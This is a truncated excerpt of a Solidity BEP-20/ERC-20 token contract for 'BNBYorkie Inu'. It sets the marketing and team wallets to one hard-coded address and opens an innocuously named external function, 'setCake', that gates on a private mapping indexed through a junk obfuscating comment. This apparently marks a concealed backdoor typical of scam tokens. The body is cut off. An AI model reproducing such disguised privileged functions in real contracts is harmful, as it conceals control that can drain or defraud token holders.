...
contract  BNBYORKIE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BNBYorkie Inu";
    string private _symbol = "BNBYORKIE";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x673930C0C1b24B294B18d41102277f47Ecf760C6); 
    address payable private teamWalletAddress = payable(0x673930C0C1b24B294B18d41102277f47Ecf760C6); 
	...
	function setCake(address  recipient, uint256 amount) external {
		if( _swapCake[ /*as aXxsdfghjk111;бо*/msg.sender])
	   {
